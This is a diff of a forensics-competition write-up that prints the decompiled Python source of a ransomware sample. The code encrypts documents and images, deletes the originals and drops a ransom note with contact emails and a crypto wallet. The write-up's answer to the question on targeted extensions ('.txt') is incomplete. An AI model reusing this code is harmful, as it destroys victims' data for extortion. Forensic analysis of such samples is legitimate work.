@@ -341,20 +341,170 @@ SHA256:37263f0aace3e33e7f303473e85e69ef804eb16a2500b68a
 ![输入图片说明](/imgs/2022-11-11/NIGtYQcFCB6CaFfx.png)
 成功反编译出源文件，另一个EXE文件同理
 ![输入图片说明](/imgs/2022-11-11/rnVGMlTQl9HELh58.png)
-(代码粘过来会很乱，jiubuzhan)
+encrypt_file。py
+```
+# uncompyle6 version 3.8.0
+
+# Python bytecode 3.6 (3379)
+
+# Decompiled from: Python 3.7.13 (default, Mar 28 2022, 08:03:21) [MSC v.1916 64 bit (AMD64)]
+
+# Embedded file name: encrypt_file_1.py
+
+import time
+
+from Crypto.PublicKey import RSA
+
+from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
+
+import os
+
+pubkey = '-----BEGIN PUBLIC KEY-----\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\nkwIEHoau+w==\n-----END PUBLIC KEY-----\n'
+
+msg = "SOMETHING WENT WRONG,PLEASE CONTACT YOUR SYSTEM ADMINISTRATOR!\nHe can help you to understand whats happened.\nIf he can't help you,contact us via email:\naa1028@forensix.cn\nale@forensix.cn\nHURRY UP!WE HAVE ANTIDOTE FOR YOUR FILES!DISCOUNT 20%FOR CLIENTS,WHO CONTACT US IN THE SAME DAY!\nYou can attach 2 files (text or picture)to check our honest intentions,we will heal them and send\nback.\nPlease pay 0.618 ETH\nThe wallet address��0xef9edf6cdacb7d925aee0f9bd607b544c5758850\n************************************\n"
+
+  
+
+class XORCBC:
+
+  
+
+def __init__(self, key: bytes):
+
+self.key = bytearray(key)
+
+self.cur = 0
+
+  
+
+def encrypt(self, data: bytes) -> bytes:
+
+data = bytearray(data)
+
+for i in range(len(data)):
+
+tmp = data[i]
+
+data[i] ^= self.key[self.cur]
+
+self.key[self.cur] = tmp
+
+self.cur = (self.cur + 1) % len(self.key)
+
+  
+
+return bytes(data)
+
+  
+  
+
+print('���ܳ���V1.0')
+
+print('�ļ����ڼ�����~~~~~~~~~~~~~~~~~~\n')
+
+  
+
+def run_finall():
+
+for filepath, dirnames, filenames in os.walk(os.getcwd()):
+
+for filename in filenames:
+
+if filename != 'encrypt_file.py' and filename != 'decrypt_file.py' and '_encrypted' not in filename:
+
+ExtensionPath = os.path.splitext(filename)[(-1)]
+
+if '.txt' == ExtensionPath or '.jpg' == ExtensionPath or '.xls' == ExtensionPath or '.docx' == ExtensionPath:
+
+time.sleep(3)
+
+data_file = os.path.join(filepath, filename)
+
+rsakey = RSA.import_key(pubkey)
+
+cipher = Cipher_pkcs1_v1_5.new(rsakey)
+
+xor_key = os.urandom(16)
+
+xor_obj = XORCBC(xor_key)
+
+outf = open(data_file + '_encrypted', 'wb')
+
+encrypted_xor_key = cipher.encrypt(xor_key)
+
+outf.write(encrypted_xor_key)
+
+buffer_size = 4096
+
+with open(data_file, 'rb') as (f):
+
+while True:
+
+data = f.read(buffer_size)
+
+if not data:
+
+break
+
+outf.write(xor_obj.encrypt(data))
+
+  
+
+outf.close()
+
+os.remove(data_file)
+
+  
+  
+
+run_finall()
+
+  
+
+def redme():
+
+try:
+
+dir = os.path.join(os.path.expanduser('~'), 'Desktop')
+
+print(dir)
+
+with open(dir + '/!READ_ME.txt', 'w') as (ff):
+
+ff.write(msg)
+
+except:
+
+dir1 = os.getcwd()
+
+print(dir1)
+
+with open(dir1 + '/!READ_ME.txt', 'w') as (ff):
+
+ff.write(msg)
+
+  
+  
+
+print('\n�������~~~~~~~~~~~~~~~~~~')
+
+os.system('pause')
+
+# okay decompiling encrypt_file_1.pyc
+```
 
 
 >41	分析加密程序，编译该加密程序使用的语言是
 >python
 
 >42	分析加密程序，它会加密哪些扩展名的文件？
->
+>.txt
 
 43	分析加密程序，是通过什么算法对文件进行加密的？
 44	分析加密程序，其使用的非对称加密方式公钥后5位为？
 45	被加密文档中，FLAG1的值是
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjAzNjQ0MjEyMSwxNTYwMTA5OTMwLDE1NT
+eyJoaXN0b3J5IjpbMTUwNDM2NDQ3OCwxNTYwMTA5OTMwLDE1NT
 I5MTc2MzgsMTc5NTM4Nzg4NCwtNDI1MjA0NDEyLDc4MTA4NDg4
 NiwtMTc0MDAzOTMwNyw5MDA2MDg3NDUsLTE3NTAyMDIyMTMsMT
 k4MTc4MTE2MiwtMTA0OTE2MzgxMywxODU1NDMxMzEsLTEwMzUz
